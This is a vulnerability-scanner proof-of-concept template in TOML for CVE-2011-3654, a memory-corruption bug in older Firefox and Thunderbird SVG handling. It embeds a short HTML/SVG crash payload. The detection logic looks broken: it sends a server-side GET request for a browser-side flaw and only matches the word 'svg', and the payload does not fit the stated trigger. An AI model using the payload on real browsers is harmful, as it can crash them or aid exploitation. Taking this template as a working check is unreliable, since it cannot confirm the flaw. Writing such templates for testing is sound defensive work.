[info]
author = "ave"
description = "Firefox/Thunderbird 8.0 之前版本浏览器引擎处理 SVG mpath 元素指向非 SVG 元素链接时存在内存破坏漏洞。构造包含恶意 SVG 的 HTML 页面，访问后浏览器崩溃即表明存在漏洞。"
id = "POC-AVE-2011-0233"
name = "Mozilla Firefox/Thunderbird SVG mpath Memory Corruption PoC"
severity = "critical"
tags = [
    "cve-2011-3654",
    "firefox",
    "thunderbird",
    "svg",
    "memory-corruption",
]
vuln_id = [
    "CVE-2011-3654",
    "AVE-2011-0233",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cve-2011-3654-poc.html"
protocol = "http"

[poc.requests.body]
content = '<html><body><svg width="100" height="100"><mpath xlink:href="#nonexistent"/></svg></body></html>'
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["svg"]
